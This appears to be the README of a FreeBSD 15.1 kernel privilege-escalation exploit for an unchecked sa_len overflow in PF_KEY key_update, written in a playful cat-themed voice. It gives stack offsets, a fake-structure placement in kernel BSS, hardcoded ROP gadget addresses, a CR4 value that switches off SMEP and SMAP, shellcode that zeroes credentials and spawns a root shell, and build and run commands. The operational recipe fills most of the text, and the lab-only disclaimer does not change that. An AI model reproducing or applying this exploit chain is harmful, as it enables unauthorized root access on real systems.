# got enuff cats?

```
  _._     _,-""`-._
 (,-.`._,'(       |\`-/|
     `-.-' \ )-`( , o o)
           `-    \`_`"'-
  meow.  _SiCk // afflicted.sh
```

FreeBSD **PF_KEY** stack overflow. Sibling of **CVE-2026-3038** (rtsock `sa_len`).  
Same family of bug: kernel trusts `sa_len` and `bcopy`s into a stack object that is way smaller than what you claim.

**Target lab:** FreeBSD **15.1-RELEASE-p2** amd64  
**Author:** `_SiCk` / [0xdeadbeefnetwork](https://github.com/0xdeadbeefnetwork)

---

## what broke

When you `SADB_UPDATE` an SA and ship `SADB_X_EXT_NEW_ADDRESS_*`, the kernel walks into `key_updateaddresses()` and does the moral equivalent of:

```c
bcopy(newaddr, &saidx->src, newaddr->sa_len);
/* and again for dst */
```

`saidx` is **stack-local** inside `key_update()`.  
`newaddr->sa_len` is **yours**.  
There is no "hey is this bigger than `sizeof(saidx->src)`?" check.

So you paint over the rest of `key_update`'s frame and the saved return address. Classic stack smash, no canary on this path in the lab kernel.

rtsock already got a CVE for the same `sa_len` sin. PF_KEY was still doing it.

---

## stack map (from disasm + marker 0xD9)

`saidx` sits at `RBP-0x90`. Offsets below are from `saidx->src[0]`:

| off | what |
|-----|------|
| 0 | `saidx.src` (overflow starts here) |
| 28 | `saidx.dst` |
| 80 | `sav` pointer (`RBP-0x40`) - later `key_freesav` |
| 88 | socket / so related |
| 96 | mbuf-ish local |
| **152** | **saved RIP** (`RBP+8`) - the catnip |

`sav->refcnt` lives at `sav+0xd8`. If that word is **0**, `key_freesav` treats the release as "not last ref" and skips the free path. Point `sav` at BSS so the word at `+0xd8` is a zero page and the free path stays quiet.

---

## two ways to meow

### 1. dual overflow, no `/dev/mem` (default PoC)

`pfkey_lpe.c`

Send **both** `NEW_ADDRESS_SRC` and `NEW_ADDRESS_DST` with `sa_len=255`.

1. first `bcopy` smashes from offset 0  
2. second `bcopy` smashes from offset 28 and **overwrites** the first payload from 28 up  
3. make `sin_addr` / family match on both so `key_checksockaddrs()` is happy  
4. success path → no `key_senderror` → no deref of trash `so`/`m` → epilogue `ret` → your ROP  

ROP + fake `sav` live in the **DST** extension:

- stack 80 → DST byte 52 → fake sav  
- stack 152 → DST byte 124 → ROP  

BSS page for fake sav is a fixed address on this no-KASLR box:

```text
0xffffffff82024000   (RW kernel BSS tail, zeros)
fake_sav = that - 0xd8
```

Unprivileged layout hint on other boxes:

```sh
sysctl vm.pmap.kernel_maps
```

### 2. single overflow + kmem walk (older)

`pfkey_lpe_kmem.c`

Needs root **and** `/dev/mem` / `libkvm` to:

- leak your PF_KEY `struct socket *` from the fd table  
- find an `M_PKTHDR` mbuf on `so_rcv`  
- pick a writable zero BSS page  

Then plant `sav` / `so` / `m` and ROP so the **error path** also survives. More moving parts. Kept as a lab fossil.

---

## ROP (this kernel)

No stack canary on the path we used. Lab box had **no KASLR**. SMEP/SMAP were **on**, so:

```text
pop rsi; ret                 @ 0xffffffff80729cdb
cr4_safe                     (measured CR4 with bits 20+21 cleared)
mov cr4, rsi; ret            @ 0xffffffff8107dcf3
shellcode                    (userspace .text)
```

Measured full CR4 on the box: `0x3506E0`  
ROP value used: `0x506E0` (SMEP + SMAP off, paging bits still sane)

Shellcode: pull `curthread` from `%gs:0`, walk to cred, zero uid/gid fields, build `iretq` frame, `swapgs; iretq` into `got_root()` → print the cat → `/bin/sh`.

SIGSEGV handler is the spare litter box if the iretq frame is wrong but creds already went to zero.

---

## privs / mdo

Opening PF_KEY needs **`PRIV_NET_RAW`** (root / suser). FreeBSD does **not** hand that out like Linux `CAP_NET_RAW`.

Lab path:

```text
testuser  →  mdo  →  root long enough to open the socket
          →  (optional setuid drop)  →  overflow
```

FreeBSD keeps an already-open raw socket usable after `setuid` drop. Root for open; the bug for the rest.

This PoC is **not** "cold unpriv → root" by itself. It is kernel LPE once you can open (or inherit) PF_KEY. Chain it with something else if you need full unpriv.

Needs `ipsec` / PF_KEY plumbing loaded enough that ESP SA ADD works.

---

## build / run

On FreeBSD 15.1-p2 (or retarget first):

```sh
# default: no libkvm, no /dev/mem
cc -o pfkey_lpe pfkey_lpe.c
mdo ./pfkey_lpe

# optional: kmem path
cc -o pfkey_lpe_kmem pfkey_lpe_kmem.c -lkvm
mdo ./pfkey_lpe_kmem
```

Hardcoded for **this** lab image: gadgets, CR4, BSS, offsets. Wrong kernel → panic. Snapshot first.

---

## files

| file | role |
|------|------|
| `pfkey_lpe.c` | dual `sa_len` overflow, no mem - the clean cat |
| `pfkey_lpe_kmem.c` | single overflow + kvm/`/dev/mem` path |

---

## notes from the hunt

- confirmed RIP land at **152** with stack marker `0xD9` on the exact p2 box  
- early drafts assumed no SMEP; real box had it - CR4 ROP fixed that  
- single overflow + error path needs valid `so`/`m` or you die before `ret`  
- dual overflow + matching sockaddrs = success path = fewer pointers to fake  
- `key_freesav` is the other sharp edge; zero refcnt via BSS is the soft landing  
- same class as CVE-2026-3038; patch hunters should grep every `sa_len` `bcopy`/`memcpy` into fixed storage, not just routing sockets  

---

## disclaimer

Lab / research / authorized testing only.  
Offsets are for one FreeBSD build. Panic is free; recovery is not.

```
meow.
```
